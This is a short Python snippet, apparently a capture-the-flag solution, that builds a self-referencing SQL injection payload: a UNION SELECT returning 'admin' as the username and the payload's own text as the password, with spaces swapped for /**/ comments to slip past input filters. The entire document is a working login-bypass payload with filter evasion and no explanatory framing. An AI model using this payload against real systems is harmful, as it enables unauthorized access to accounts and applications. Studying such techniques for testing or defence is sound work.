s = "' UNION SELECT 'admin' AS username, substr(s.q, 1, 112)||quote(s.q)||substr(s.q, 117)AS password FROM (SELECT ''' UNION SELECT ''admin'' AS username, substr(s.q, 1, 112)||quote(s.q)||substr(s.q, 117) AS password FROM (SELECT ''%s'' AS q) AS s--' AS q) AS s--"

print(s.replace(' ', '/**/'))